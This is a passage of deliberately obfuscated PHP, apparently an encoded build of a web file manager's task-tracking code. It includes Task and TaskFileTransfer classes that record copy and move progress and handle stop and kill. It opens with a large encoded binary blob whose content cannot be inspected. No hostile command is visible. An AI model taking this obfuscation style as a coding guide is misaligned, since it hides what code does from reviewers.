uV7CYzNBZqF1oKEBpjbZ3QQzO4gnUhjSAcoxG2FuNZPPHTw+SSuPHjIlPYtjZs=')."\344\21\237\26\62\131\21\347\334\324\122\17\47\350\251\24\117\107\10\107\267\71\14\31\135\11\320\312\160\306\203\367\355\274\343\1\152\204\7\16\153\30\127\41\340\141\135"."\366\52\116\162\211\176\10\233\120\4\62\250\217\157\151\140\304\171\75\365\366\301\214\131\71\135\22\340\204\301\201\345\147\376\76\156\314\13\67\66\341\135\301\232\132\174\143"."\323\241\133\351\32\343\367\352\260\105\16\336\44\270\105\245\45\7\130\54\107\116\313\21\240\26\110\216\334\34\304\123\215\60\167\127\134\7\20\355\214\372\71\250\205\57\117"."\52\67\12\47\103\255\314\314\107\274\131\75\222\327\323\112\70\322\21\152\15\204\333\102\361\305\112\277\146\113\157\255\23\17\371\316\245\114\124\136\164\340\31\126\367\162\47"."\xf1\xf8\xd3\xdb\x8b\x98\x4a\x6f\x86\xf3\xd6\x96\xe0\xa2\x25\x3b\x2c\xe9\x5\x1c\x67\xb1\x14\xff\x34\xb3\xac\xc4\x2\xbe\x53\x91\x2b\xcb\x83\x15\x79\x15\x52\xe7\x84\x5e\x4b\x4a\x5c\x34\xb5"."\362\364\143\32\171\206\132\264\130\312\120\252\320\32\110\137\271\6\204\376\316\324\150\43\326\12\23\65\136\57\14\353\226\56\26\76\313\61\46\227\56\124\225\46\177\247\40"."\x23\x3f\x6b\x20\xcd\x80\x18\x6c\x5a\x4b\xb9\x8f\x2b\xf0\x10\x24\x7b\xc7\x76\x9\xcd\x74\x9a\x64\x5f\x67\x45\xa6\x78\x87\xc7\xd7\xc4\xbb\x18\x24\x28\xbd\x58\x52\x34\x55\xdd\xd2\x24\x0\x7d"."\x3a\xa3\xe\xae\x2a\x20\x11\xdf\xf1\xa4\x58\xae\x4f\xa\x96\x9c\x3b\x68\xc5\xaa\x52\xb4\x2\x6\x93\xdc\xa9\x55\x4a\x10\xc3\xf\x42\xff\xaf\x9b\xaa\x67\x84\x5b\x23\x3d\xc3\xce\xff\xf9\xcd"."\x32\xea\x78\xbd\x55\x7e\x7e\x8e\xd5\x59\xf6\x2a\xcb\xb7\xbe\xef\xe2\x11\x47\x15\x29\xe2\x22\x86\x3d\x22\x45\x5e\xb1\x87\x73\x18\x7e\xc6\x9d\x22\x4a\xbd\x94\xa8\x2\xc9\x6c\xe6\x58\x51\x3e"."\x2b\xf2\x67\xfc\x7c\x88\xe9\x7\xf6\xde\x16\x64\x4a\x63\x1c\x10\xc\x30\x4e\xe\xa5\xe1\xea\xa8\x8\x84\x4\x32\xac\x7d\x61\xac\x32\xb3\x33\x44\xf4\x0\xc6\xd9\x71\x56\xea\x7a\xa9\xc6\x6d"."\206\351\170\332\271\254\16\154\315\5\345\20\375\16\112\271\112\164\16\205\370\143\12\42\253\73\246\102\3\120\264\42\64\30\74\201\322\254\324\323\267\223\270\173\174\145\76"."\xbb\x27\x2b\x2a\x20\xfe\x96\x82\xf9\xa2\xed\x10\xf\x3b\x65\xfb\x6b\x69\x6e\x28\x80\x70\x34\x42\x24\xc0\x56\x2c\x46\x7e\xac\xc\xe0\x50\x5b\x84\x59\xbb\xb8\xd9\x1b\x7e\x1c\xa0\xd0\x67\xc8"."\343\107\10\57\66\246\247\17\233\121\71\324\203\170\172\315\56\177\353\204\146\377\377\222\221\106\306\45\143\100\147\41\345\15\262\334\133\232\140\257\360\63\56\131\143\304\371"."\xba\x19\x86\xb8\x1f\x6e\x71\x3c\xd9\x22\x2d\x1a\x72\x9d\x53\x7e\x64\x86\x3d\xf5\x81\x38\x57\xc7\x7b\x3c\x52\x81\x53\xe9\x4f\x12\x7e\xd9\x66\xe4\x2e\x9a\x92\x1f\xa8\xbd\x96\xa3\x4a\x6b\x56"."\317\145\114\156\154\41\0\135\232\20\51\111\56\154\157\240\262\327\63\311\33\117\155\214\322\302\153\17\316\7\47\70\130\161\76\137\41\136\5\21\73\237\363\335\4\176\144".strrev('¢p^CÆVHöRÅŸšÚdŠé%²ßÉŒµ•i…?({ö¡#	»Çl·	h').base64_decode('zP2chLR+OFWUc/fnjF41F6M2So4LFSaShbjdoSMZBfnVYnHCIw3gcejxRqkQoqo=').base64_decode('YgfUlGQt2cSVHuSIO0qQHNUWpSc30G25SHaaxpWT7dJbyf7y0zdsQwWrXTYxhIM=')."\x50\x9f\x2c\xc\x41\x2\x65\xbe\x22\x26\xd8\xb1\xc8\x30\x42\x20\x8e\xd4\x43\x3e\xc8\x2a\x96\x99\xe7\x6f\x80\x72\x3c\x74\x3e\x38\x42\x11\x96\xfc\xb4\x69\x7d\x5c\x92\xc0\x61\xb1\xd3\xca\xde"."\30\304\251\273\373\355\52\126\15\177\210\313\103\173\46\236\127\244\317\156\171\370\23\133\36\352\76\317\3\17\153\171\304\135\263\157\172\263\104\74\201\352\174\67\25\267\231"."\333\344\225\261\364\156\156\236\17\225\53\103\314\75\160\11\243\134\307\47\316\34\13\245\274\70\305\105\1\247\164\123\326\141\251\207\45\63\347\41\47\256\36\346\243\314\65"."\34\242\127\362\314\124\30\303\157\57\203\232\146\22\221\45\343\244\72\115\363\173\115\166\152\345\116\246\73\260\56\145\152\342\316\5\165\346\130\366\66\316\212\174\246\161\306"."\254\271\262\152\100\314\217\70\377\141\216\275\351\17\360\0\142\306\25\47\76\51\314\203\244\274\156\111\244\323\152\266\374\5\74\27\5\376\337\141\276\340\275\151\122\311\206"."\265\374\235\320\262\21\40\110\50\131\167\110\33\222\353\50\337\300\47\354\226\130\76\164\13\22\357\336\71\353\242\233\162\205\176\110\373\216\130\11\364\41\62\43\207\45\324".base64_decode('PNay2qbqFMcqSR1kJJiIo5NHfDV328nAgC5CREtiiVyibbgVKTg73peIHi9SyME=')."\xb6\x89\xef\xd0\x8a\x35\x25\x91\x94\xff\xc5\x4\x32\xc9\x83\xa\x29\xc2\x90\xa3\x42\xcf\xfd\xc7\x32\xba\x51\xe1\xa1\x39\xe9\x34\xfc\x1b\xda\x4d\x79\x26\x2e\x65\x79\x55\xdb\x2b\x21\xa4\xa4".base64_decode('fNPsCJlg4D6E0Ofsq6t4lE2UscqjTJSonHGS3qMT3pMklgnnZpf1JpCZGXGSX9o=')."\xb3\xb3\x42\x28\xa0\x2b\xd4\xb1\x5a\x25\xbf\xac\xf2\xed\x25\x52\x90\xbc\xc\xca\x8b\x96\x1e\x3c\x13\x6a\x14\xa2\x77\x81\x4e\xc0\x1a\x26\x4e\x21\xc9\xad\xb5\x40\x7\xbf\xc9\xa6\x4a\xc6\x37"."\170\74\245\267\46\15\371\333\171\115\74\302\74\141\242\372\34\122\32\12\267\271\236\43\45\164\310\375\106\51\33\24\262\370\5\135\223\256\104\72\104\2\376\234\224\103\104"."\xb0\xdc\x2f\xbd\x21\x96\x4a\xf6\x51\x8b\x82\x1c\xed\x61\x3\x5\x2\x48\xec\x9a\x69\x6d\xd2\xfe\x28\xb6\x42\xf1\x35\xd1\xeb\xe1\xce\xa7\xc5\x1d\x37\x47\xb1\xdf\x1f\xd7\x5a\x67\xf7\x51\x2d".base64_decode('1/uL1M8o/Wbs9f/vp83+b71oNqueKasdr5l2AJPLOLJxyUMxVZS6+uHcJicBFvE=').base64_decode('93ulMDfeZL6fmEsolR2uqLmc+6SxTCwoe/gRId8gf62wUsDpbzglv9ZbQTJl3KY=').base64_decode('9Pivnh6scDCIBz/sdNYr8QhlyQS5QqwE84nlZ19pLDVhRpJRSfmqY6TI5KtaIMw=')."\253\216\145\324\204\134\236\6\242\42\23\22\7\250\214\374\44\34\103\352\0\312\243\45\36\57\347\117\47\73\162\164\271\136\302\243\211\54\171\154\235\267\65\45\223\251\362".base64_decode('M+PykviSlrNg81enWoc/U1zvfre4wVteGbU+x5qFGJblmXaGHGeQ48YKeSgKxkU=')."\x9a\x9\x16\x41\xe5\xa5\xc8\x5f\x23\x14\xaa\x2a\xfc\x25\xf7\x97\x2d\xe9\xa8\x69\x10\xde\xcc\x9\xe5\xfa\xd\xc9\xf2\x50\x7a\x33\xb7\xec\x4d\x4c\xd7\xb1\x0\x12\x94\xc4\x39\x99\x6e\x10\xaf"."\335\320\355\170\117\127\15\271\100\1\130\213\370\374\166\103\274\135\236\57\122\205\231\274\275\262\233\113\222\341\57\200\34\152\55\113\176\6\301\231\23\233\162\73\127\315\202"."\112\311\322\206\151\111\311\70\274\122\132\214\77\262\200\57\307\341\47\111\155\307\110\13\67\353\156\367\352\104\140\246\62\260\103\24\206\3\113\31\44\235\347\41\256\70\343"."\174\257\201\104\22\60\163\312\10\45\110\47\122\316\3\101\356\176\272\214\300\225\364\260\24\115\162\61\137\137\350\27\337\356\12\11\67\2\44\232\352\332\3\303\150\100\314"."\xca\xb9\x9c\xaf\x15\x4b\xc7\x87\x69\x82\x57\xc1\xf2\x13\x22\x71\x70\x25\xb1\x7\x2c\x1b\x16\x59\x4\xe5\x76\xc1\xa5\xed\x41\x50\x45\x75\x58\x70\x33\x82\x69\xce\x64\xf8\xcb\xd8\x8e\xa4\x19"."\46\66\160\50\202\210\107\264\61\67\44\135\30\25\166\310\332\210\373\341\123\237\174\311\324\221\260\34\52\56\224\112\371\305\31\202\350\46\206\125\352\76\131\116\316\354\362"."\x85\x55\x8e\x54\x2\x44\x3d\xee\x73\xc3\x1a\x49\x40\xc1\xf6\xf4\xc2\xe2\x86\x76\x85\x4b\xdb\xa2\x4a\xe7\xf5\x58\x9e\x8c\xcf\x19\x4a\x43\x6e\x2f\x78\x1d\x50\x97\xc8\x85\x75\x17\x6c\xa3\x77"."\105\131\362\243\337\316\123\101\131\374\227\120\100\313\205\245\342\344\23\303\11\63\304\53\127\42\260\322\71\304\322\275\142\21\301\66\65\303\61\370\22\41\344\35\203\224\61"."\71\322\321\34\367\324\22\151\101\240\57\5\346\211\276\223\306\5\234\121\64\275\346\152\275\234\301\335\63\232\303\32\321\355\164\126\22\141\312\43\313\341\146\331\240\102\105".base64_decode('ldvrbhUbU7dgJwopa49kdpAwKuShLaqYjUbhnILLdOSdYAhwXhqF85ZFs8ySHkQ=')."\xca\x67\xab\x25\x6b\x82\xee\x95\xf\x1e\x28\x7\x32\x15\x3a\xec\x12\xa1\x69\xd2\x89\xc6\xb3\x62\xe2\xf2\xea\x0\xe3\xdc\xa9\x89\x36\xa1\x72\x2b\x84\x12\xc0\x75\xfc\x5b\xa9\x15\x15\x13\x4f"."\330\12\221\332\265\13\124\242\265\54\246\2\165\25\166\0\345\164\134\304\125\260\112\240\145\342\75\132\366\63\124\41\132\66\161\250\154\4\21\253\270\364\55\247\165\202\13".strrev('ÈFŠÍÃ’Jj\'4¬®¯9äşTûa“ØFDÛàÁ`Â¥é êú²]Àx2BT³.').base64_decode('HiyBl8u6OfZUmmy9TaUbAzHimtOrp+xhiMazSnKS3s6lMhP6AMdBegWlEgEBKyc=')."\124\323\16\213\170\272\377\203\116\236\36\265\265\342\43\135\176\34\103\334\116\322\375\222\106\307\15\323\366\340\270\204\121\44\277\55\206\155\213\243\147\52\145\23\46\17\157"."\x7a\x1e\xc9\x82\x2\x7d\x89\xb3\x17\x3c\x8a\xe4\x38\x80\xa0\x23\x21\x1b\xe4\x13\xe\xfd\xb0\xf8\x1a\xd7\x68\x2c\x21\x36\x8e\x0\x3e\x66\xe0\x1\x79\x4f\x83\xc3\xbf\xf6\x92\xeb\x78\x52\x0"."\220\260\331\153\214\62\247\176\370\246\255\150\217\170\51\135\165\63\162\202\7\1\174\223\355\101\310\175\146\313\117\143\374\340\30\336\113\312\200\227\236\174\3\305\176\107\166"."\xfa\x5e\xe\xb7\x71\xfc\xa6\x12\x40\xa5\x29\x8a\xa0\x5e\xa1\x89\xe2\x9\xbb\x4e\xa7\x4e\x11\xcb\xa2\xa2\x81\x78\x7c\x59\x24\xd6\x46\x9d\x48\x97\x45\x93\x5c\x92\x7d\x4d\x59\x54\xb4\x33\xd2".base64_decode('PVFcsCsQCpfFYVOc7pTw+kSjQlHSykA4HFk2UStCrYtFS8iJqtCUF7MGU4Czk4Q=')."\270\232\143\62\267\164\111\117\313\13\367\137\42\217\123\225\40\317\253\305\74\343\361\17\347\213\54\56\213\67\206\260\120\20\66\243\351\206\262\143\105\200\142\247\332\174\161"."\x73\x66\x59\x1c\x11\xfb\x1c\x47\xc9\x12\x9c\xac\xd\x42\x51\x24\x9c\x93\x37\x53\x2\xa8\xab\x38\x40\xb2\x96\xb5\x5c\xeb\x4f\x62\xc5\x0\xe0\x86\x2d\x32\xc0\x6\x6b\xc0\xe8\x95\xb4\xfa\x54".base64_decode('VIGLcjCkkqkU/Ybo/wNzpH/AjaYAAA==')."".strrev('')."", 10, -8))); goto Aì«Ú¯ê¤; Cå†½„èî: function binCheckBigger($¡î§æ—…, $ôë€’à) { return $¡î§æ—… > $ôë€’à; } $_SERVER[$_SERVER[¹øóÜÍ­][3]] = ("\67\71\70\67"."\67\60")+0;$_5ex0="voe6p0b1ywgnz54d7cxah9jlku28itqrfm3s8utzpdqge7mn1ob3r6silfcvkw95a0jx2h4yncmit3vfjl";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($§°‚Ş§¬, $óÂŸÎ‡Ğ) { $è“ñÕ‡è =& $_SERVER[ë¦»ºéÌ]; if (isset(self::$_methodList[$§°‚Ş§¬])) { return @call_user_func_array(self::$_methodList[$§°‚Ş§¬], $óÂŸÎ‡Ğ); } else { if (method_exists($this, $§°‚Ş§¬)) { return call_user_func_array(array($this, $§°‚Ş§¬), $óÂŸÎ‡Ğ); } else { think_exception(__CLASS__ . $è“ñÕ‡è[4] . $§°‚Ş§¬ . $è“ñÕ‡è[5]); } } } public static function __callStatic($÷øøÇİï, $âçÅåÚ) { if (isset(self::$_methodListStatic[$÷øøÇİï])) { return call_user_func_array(self::$_methodListStatic[$÷øøÇİï], $âçÅåÚ); } else { if (method_exists(self, $÷øøÇİï)) { return call_user_func_array(array(self, $÷øøÇİï), $âçÅåÚ); } else { show_json("{$÷øøÇİï}\50\x29\40\x6e\157\164\x20\x65\170\151\163\164\73", !1); } } } public static function addMethod($ç™—ü–¯, $‡œâúË¯) { self::$_methodList[$ç™—ü–¯] = $‡œâúË¯; } public static function addMethodStatic($ß¡À‘©µ, $şÎòˆ«») { self::$_methodListStatic[$ß¡À‘©µ] = $şÎòˆ«»; } } goto Bøïö™Á¡•; aÆæ¯îó¯ß: class Task { const STATYS_STOP = "\x73\164\x6f\160"; const STATYS_RUNNING = "\162\x75\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($úƒ¨¥ğõ, $©Èï—¢² = '', $ÓÃ•Ó•  = 0, $ş—É©½ø = '') { $¨«Ôæ¨á =& $_SERVER[ë¦»ºéÌ]; if (self::get($úƒ¨¥ğõ)) { return; } $this->task = array($¨«Ôæ¨á[403] => $úƒ¨¥ğõ, $¨«Ôæ¨á[1632] => USER_ID, $¨«Ôæ¨á[1532] => $ş—É©½ø, $¨«Ôæ¨á[43] => $©Èï—¢², $¨«Ôæ¨á[1044] => $¨«Ôæ¨á[12], $¨«Ôæ¨á[770] => $ÓÃ•Ó• , $¨«Ôæ¨á[1633] => 0, $¨«Ôæ¨á[1634] => 0, $¨«Ôæ¨á[1635] => 0, $¨«Ôæ¨á[1636] => timeFloat(), $¨«Ôæ¨á[1637] => 0, $¨«Ôæ¨á[1638] => 0, $¨«Ôæ¨á[1639] => 0, $¨«Ôæ¨á[1640] => 0, $¨«Ôæ¨á[734] => $¨«Ôæ¨á[1592]); $GLOBALS[$¨«Ôæ¨á[1641]] = 1; Hook::bind($¨«Ôæ¨á[1595], array($this, $¨«Ôæ¨á[1642])); Hook::bind($¨«Ôæ¨á[1643], array($this, $¨«Ôæ¨á[1644])); $this->startAfter(); Hook::trigger($¨«Ôæ¨á[1645], $this->task); $this->task[$¨«Ôæ¨á[1638]] = timeFloat(); } public function end() { $ ¹šß =& $_SERVER[ë¦»ºéÌ]; if (!$this->task) { return; } if ($this->task[$ ¹šß[1638]]) { self::valueSet($this->task[$ ¹šß[403]], !1); } $¶È²Æ³ƒ = timeFloat() - $this->task[$ ¹šß[1636]]; self::log($ ¹šß[1646] . $this->task[$ ¹šß[403]] . $ ¹šß[1647] . $¶È²Æ³ƒ . $ ¹šß[1648]); Hook::unbind($ ¹šß[1595], array($this, $ ¹šß[1642])); Hook::unbind($ ¹šß[1643], array($this, $ ¹šß[1644])); $this->endAfter(); $this->task = !1; } public function update($²¨éí‡ = 0, $Œå£Ù˜ = false) { $˜¤ÓÂ°Í =& $_SERVER[ë¦»ºéÌ]; $ˆ®‹®Ò =& $this->task; if (!$ˆ®‹®Ò) { return; } $ˆ®‹®Ò[$˜¤ÓÂ°Í[1633]] += $²¨éí‡; $ˆ®‹®Ò[$˜¤ÓÂ°Í[1637]] = timeFloat(); if ($ˆ®‹®Ò[$˜¤ÓÂ°Í[770]]) { if ($ˆ®‹®Ò[$˜¤ÓÂ°Í[770]] < $ˆ®‹®Ò[$˜¤ÓÂ°Í[1633]]) { $ˆ®‹®Ò[$˜¤ÓÂ°Í[770]] = $ˆ®‹®Ò[$˜¤ÓÂ°Í[1633]]; } $ëùö¥…Û = timeFloat() - $ˆ®‹®Ò[$˜¤ÓÂ°Í[1636]] - $ˆ®‹®Ò[$˜¤ÓÂ°Í[1639]]; $ˆ®‹®Ò[$˜¤ÓÂ°Í[1634]] = $ˆ®‹®Ò[$˜¤ÓÂ°Í[1633]] / $ˆ®‹®Ò[$˜¤ÓÂ°Í[770]]; $ˆ®‹®Ò[$˜¤ÓÂ°Í[1635]] = $ˆ®‹®Ò[$˜¤ÓÂ°Í[1633]] / $ëùö¥…Û; if ($ˆ®‹®Ò[$˜¤ÓÂ°Í[1634]] > 0) { $ˆ®‹®Ò[$˜¤ÓÂ°Í[1640]] = $ëùö¥…Û * (1 - $ˆ®‹®Ò[$˜¤ÓÂ°Í[1634]]) / $ˆ®‹®Ò[$˜¤ÓÂ°Í[1634]]; } $ˆ®‹®Ò[$˜¤ÓÂ°Í[1640]] = $ˆ®‹®Ò[$˜¤ÓÂ°Í[1640]] <= 0 ? 0 : $ˆ®‹®Ò[$˜¤ÓÂ°Í[1640]]; } $this->updateAfter(); $ã…èıå° = 0.2; if (timeFloat() - $ˆ®‹®Ò[$˜¤ÓÂ°Í[1638]] < $ã…èıå° && !$Œå£Ù˜) { return; } $‘†’òñ = self::get($ˆ®‹®Ò[$˜¤ÓÂ°Í[403]]); $Ç¸åÄ²‘ = $‘†’òñ[$˜¤ÓÂ°Í[734]]; if ($Ç¸åÄ²‘ == self::STATYS_KILL) { $…Úµê¦ô = array($˜¤ÓÂ°Í[1649] => LNG($˜¤ÓÂ°Í[1650]), $˜¤ÓÂ°Í[1169] => !1); Cache::set($˜¤ÓÂ°Í[1651] . $this->task[$˜¤ÓÂ°Í[403]], $…Úµê¦ô, 30); $this->onKill(); $this->end(); die; } else { if ($Ç¸åÄ²‘ == self::STATYS_STOP) { $ÉòÓôˆÖ = 2; $‘†’òñ[$˜¤ÓÂ°Í[1639]] += $ÉòÓôˆÖ; self::valueSet($ˆ®‹®Ò[$˜¤ÓÂ°Í[403]], $‘†’òñ); sleep($ÉòÓôˆÖ); $this->update(); return; } } $ˆ®‹®Ò[$˜¤ÓÂ°Í[734]] = $Ç¸åÄ²‘ ? $Ç¸åÄ²‘ : $ˆ®‹®Ò[$˜¤ÓÂ°Í[734]]; $ˆ®‹®Ò[$˜¤ÓÂ°Í[1639]] = $‘†’òñ[$˜¤ÓÂ°Í[1639]] ? $‘†’òñ[$˜¤ÓÂ°Í[1639]] : 0; $ˆ®‹®Ò[$˜¤ÓÂ°Í[1638]] = timeFloat(); Hook::trigger($˜¤ÓÂ°Í[1652], $ˆ®‹®Ò); self::valueSet($ˆ®‹®Ò[$˜¤ÓÂ°Í[403]], $ˆ®‹®Ò); } public function onKillSet($ÔÔÉÀ¬­, $óü§¬ßç = array()) { $this->onKillCall = array($ÔÔÉÀ¬­, $óü§¬ßç); } public function onKill() { $Üà˜á“Œ =& $_SERVER[ë¦»ºéÌ]; self::log($Üà˜á“Œ[1646] . $this->task[$Üà˜á“Œ[403]] . $Üà˜á“Œ[1653]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ä±õ“§Ï) { $ÉŞâÛ¥« =& $_SERVER[ë¦»ºéÌ]; Cache::set($ÉŞâÛ¥«[1651] . $this->task[$ÉŞâÛ¥«[403]], $ä±õ“§Ï, 60); return $ä±õ“§Ï; } public static function get($„†Ü Õ‚) { $Ó…ö€Øı =& $_SERVER[ë¦»ºéÌ]; $…ÎÏŞÔç = self::valueGet($„†Ü Õ‚); if (is_array($…ÎÏŞÔç) && $…ÎÏŞÔç[$Ó…ö€Øı[1654]]) { $Éı²ê¿Ø = ActionApply($…ÎÏŞÔç[$Ó…ö€Øı[1654]], array($…ÎÏŞÔç)); $…ÎÏŞÔç = is_array($Éı²ê¿Ø) ? $Éı²ê¿Ø : $…ÎÏŞÔç; } return $…ÎÏŞÔç; } public static function listData() { $ËŞ’½íĞ = self::valueGet(); return array_sort_by($ËŞ’½íĞ, $_SERVER[ë¦»ºéÌ][1636], !0); } public static function kill($Ÿ×…ÜÒ) { return self::changeStatus($Ÿ×…ÜÒ, self::STATYS_KILL); } public static function stop($®âÓ©Ï£) { return self::changeStatus($®âÓ©Ï£, self::STATYS_STOP); } public static function restart($ùÖ¾Ù») { return self::changeStatus($ùÖ¾Ù», self::STATYS_RUNNING); } public static function killAll() { $¶µ‚üÖà =& $_SERVER[ë¦»ºéÌ]; $×·ïÔÏ€ = self::listData(); foreach ($×·ïÔÏ€ as $µÑ€êñ») { self::kill($µÑ€êñ»[$¶µ‚üÖà[403]]); } sleep(2); foreach ($×·ïÔÏ€ as $µÑ€êñ») { self::valueSet($µÑ€êñ»[$¶µ‚üÖà[403]], !1); } } private static function changeStatus($’ÄÃ—¦, $àğÍŒ³É) { $¹ƒ‚Ÿşë =& $_SERVER[ë¦»ºéÌ]; $®¹É÷æÈ = self::valueGet($’ÄÃ—¦); if (!$®¹É÷æÈ) { return !1; } $®¹É÷æÈ[$¹ƒ‚Ÿşë[734]] = $àğÍŒ³É; self::valueSet($’ÄÃ—¦, $®¹É÷æÈ); self::log($¹ƒ‚Ÿşë[1655] . $®¹É÷æÈ[$¹ƒ‚Ÿşë[403]] . $¹ƒ‚Ÿşë[1656] . $àğÍŒ³É); return !0; } public static function valueGet($å‡é»¤Œ = false) { $–şÖÇó• =& $_SERVER[ë¦»ºéÌ]; if ($å‡é»¤Œ) { $×¦¤Ãøµ = Model($–şÖÇó•[447])->where(array($–şÖÇó•[105] => $å‡é»¤Œ, $–şÖÇó•[43] => $–şÖÇó•[1051]))->find(); return $×¦¤Ãøµ ? json_decode($×¦¤Ãøµ[$–şÖÇó•[380]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ôÆô¤ğ = false) { $ä¥¨õ¦ =& $_SERVER[ë¦»ºéÌ]; $½ÆÚÜ£Ö = array($ä¥¨õ¦[43] => $ä¥¨õ¦[1051]); if ($ôÆô¤ğ) { $½ÆÚÜ£Ö[$ä¥¨õ¦[1632]] = $ôÆô¤ğ; } $”¤˜˜å¿ = Model($ä¥¨õ¦[447])->where($½ÆÚÜ£Ö)->select(); $”¤˜˜å¿ = $”¤˜˜å¿ ? $”¤˜˜å¿ : array(); foreach ($”¤˜˜å¿ as $³Ëúı¾û => $©ËºâªÜ) { $”¤˜˜å¿[$³Ëúı¾û] = json_decode($©ËºâªÜ[$ä¥¨õ¦[380]], !0); } return $”¤˜˜å¿; } public static function valueSet($²üğ…„, $­¤Ôé¤™) { $¶ÔÃÚ¨ =& $_SERVER[ë¦»ºéÌ]; if (!$­¤Ôé¤™) { return Model($¶ÔÃÚ¨[447])->where(array($¶ÔÃÚ¨[105] => $²üğ…„, $¶ÔÃÚ¨[43] => $¶ÔÃÚ¨[1051]))->delete(); } $ÜíåÁØ¼ = json_encode($­¤Ôé¤™); if (!$ÜíåÁØ¼) { ob_start(); var_dump($­¤Ôé¤™); $¤Î•Õü‡ = ob_get_clean(); self::log($¶ÔÃÚ¨[1657] . json_encode_force($¤Î•Õü‡)); } if (!$²üğ…„ || !$­¤Ôé¤™[$¶ÔÃÚ¨[403]]) { return !1; } $ÒãÔ‚Š = array($¶ÔÃÚ¨[43] => $¶ÔÃÚ¨[1051], $¶ÔÃÚ¨[1632] => USER_ID, $¶ÔÃÚ¨[105] => $²üğ…„, $¶ÔÃÚ¨[380] => $ÜíåÁØ¼); $˜¦¤Æà– = $¶ÔÃÚ¨[1658]; CacheLock::lock($˜¦¤Æà–); Model($¶ÔÃÚ¨[447])->add($ÒãÔ‚Š, array(), !0); CacheLock::unlock($˜¦¤Æà–); } public static function log($ßŞÒ²ç±) { if (!GLOBAL_DEBUG) { return; } write_log($ßŞÒ²ç±, $_SERVER[ë¦»ºéÌ][1659]); } } class TaskFileTransfer extends Task { protected function startAfter() { $­í¿“É® =& $_SERVER[ë¦»ºéÌ]; $ªïÁâ‚û =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($­í¿“É®[1660], array($this, $­í¿“É®[1661])); Hook::bind($­í¿“É®[1193], array($this, $­í¿“É®[1662])); Hook::bind($­í¿“É®[1663], array($this, $­í¿“É®[1664])); Hook::bind($­í¿“É®[600], array($this, $­í¿“É®[1665])); Hook::bind($­í¿“É®[601], array($this, $­í¿“É®[1666])); Hook::bind($­í¿“É®[603], array($this, $­í¿“É®[1667])); Hook::bind($­í¿“É®[604], array($this, $­í¿“É®[1667])); Hook::bind($­í¿“É®[570], array($this, $­í¿“É®[1668])); Hook::bind($­í¿“É®[567], array($this, $­í¿“É®[1668])); Hook::bind($­í¿“É®[572], array($this, $­í¿“É®[1668])); Hook::bind($­í¿“É®[574], array($this, $­í¿“É®[1668])); Hook::bind($­í¿“É®[576], array($this, $­í¿“É®[1668])); Hook::bind($­í¿“É®[1669], array($this, $­í¿“É®[1670])); Hook::bind($­í¿“É®[593], array($this, $­í¿“É®[1671])); $this->sourceModelCopyFlag = !1; Hook::bind($­í¿“É®[1672], array($this, $­í¿“É®[1673])); Hook::bind($­í¿“É®[1674], array($this, $­í¿“É®[1675])); Hook::bind($­í¿“É®[1676], array($this, $­í¿“É®[1677])); $ªïÁâ‚û[$­í¿“É®[1678]] = LNG($­í¿“É®[1679]); $ªïÁâ‚û[$­í¿“É®[1680]] = 0; $ªïÁâ‚û[$­í¿“É®[1681]] = 0; $ªïÁâ‚û[$­í¿“É®[1044]] = $­í¿“É®[12]; $ªïÁâ‚û[$­í¿“É®[1682]] = $­í¿“É®[12]; $ªïÁâ‚û[$­í¿“É®[1683]] = 0; $ªïÁâ‚û[$­í¿“É®[1684]] = 0; $ªïÁâ‚û[$­í¿“É®[1685]] = 0; if (!$ªïÁâ‚û[$­í¿“É®[1532]]) { $ªïÁâ‚û[$­í¿“É®[1532]] = LNG($­í¿“É®[1686]); } } protected function endAfter() { $¨ “Á =& $_SERVER[ë¦»ºéÌ]; Hook::unbind($¨ “Á[1660], array($this, $¨ “Á[1661])); Hook::unbind($¨ “Á[1193], array($this, $¨ “Á[1662])); Hook::unbind($¨ “Á[1663], array($this, $¨ “Á[1664])); Hook::unbind($¨ “Á[600], array($this, $¨ “Á[1665])); Hook::unbind($¨ “Á[601], array($this, $¨ “Á[1666])); Hook::unbind($¨ “Á[603], array($this, $¨ “Á[1667])); Hook::unbind($¨ “Á[604], array($this, $¨ “Á[1667])); Hook::unbind($¨ “Á[570], array($this, $¨ “Á[1668])); Hook::unbind($¨ “Á[567], array($this, $¨ “Á[1668])); Hook::unbind($¨ “Á[572], array($this, $¨ “Á[1668])); Hook::unbind($¨ “Á[574], array($this, $¨ “Á[1668])); Hook::unbind($¨ “Á[576], array($this, $¨ “Á[1668])); Hook::unbind($¨ “Á[1669], array($this, $¨ “Á[1670])); Hook::unbind($¨ “Á[593], array($this, $¨ “Á[1671])); Hook::unbind($¨ “Á[1672], array($this, $¨ “Á[1673])); Hook::unbind($¨ “Á[1674], array($this, $¨ “Á[1675])); Hook::unbind($¨ “Á[1676], array($this, $¨ “Á[1677])); } public function copyMoveStart($×õ‘“ÎŸ, $¯ëÎ£º¸, $ÎÃä†‘Õ, $†›ßğŞ€) { $ü«¯ì‰  =& $_SERVER[ë¦»ºéÌ]; self::log($ü«¯ì‰ [1687] . $¯ëÎ£º¸ . $ü«¯ì‰ [80] . $†›ßğŞ€); $®•“°¿ü = rtrim(TEMP_FILES, $ü«¯ì‰ [8]); if (substr($¯ëÎ£º¸, 0, strlen($®•“°¿ü)) == $®•“°¿ü) { return; } if (substr($†›ßğŞ€, 0, strlen($®•“°¿ü)) == $®•“°¿ü) { return; } $úÚ˜Î‘ï =& $this->task; $úÚ˜Î‘ï[$ü«¯ì‰ [1688]] = KodIO::transferType($×õ‘“ÎŸ, $ÎÃä†‘Õ); $this->update(); } public function updateAfter() { $§âõ§ƒ» =& $_SERVER[ë¦»ºéÌ]; $„˜óµ¤ =& $this->task; if (!$„˜óµ¤[$§âõ§ƒ»[747]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($„˜óµ¤[$§âõ§ƒ»[1688]] == $§âõ§ƒ»[1282]) { return; } self::updateTask($„˜óµ¤); } private static function updateTask(&$½®«Ö¦Û) { $Šå††ß =& $_SERVER[ë¦»ºéÌ]; if ($½®«Ö¦Û[$Šå††ß[1688]] == $Šå††ß[1177] || $½®«Ö¦Û[$Šå††ß[1688]] == 